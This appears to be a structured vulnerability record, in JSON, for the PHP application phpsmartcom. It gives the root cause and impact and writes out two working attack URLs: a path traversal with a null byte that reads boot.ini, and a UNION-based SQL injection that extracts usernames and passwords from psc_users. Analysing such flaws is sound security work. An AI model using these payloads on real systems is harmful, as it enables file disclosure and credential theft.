  "Root cause of vulnerability": "The application is vulnerable to local file inclusion due to insufficient input sanitization.",
  "Weaknesses/vulnerabilities present": [
    "Local File Inclusion (LFI)",
    "SQL Injection"
  ],
  "Impact of exploitation": "An attacker can read arbitrary files from the server via LFI. They can also potentially gain unauthorized access to the database via SQL injection.",
  "Attack vectors": {
    "Local File Inclusion": "By manipulating the `p` parameter in the URL. Example: `http://127.0.0.1/phpsmartcom/index.php?p=../../../../../boot.ini%00`",
     "SQL Injection": "By manipulating the `uid` parameter in the URL. Example: `http://localhost/phpsmartcom/index.php?p=viewprofile&uid=1'+union+select+1,uname,3,upwd,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+psc_users+where+uid=1+limit+1,1/*`"
    },
  "Required attacker capabilities/position": "The attacker needs to be able to send HTTP requests to the vulnerable application."
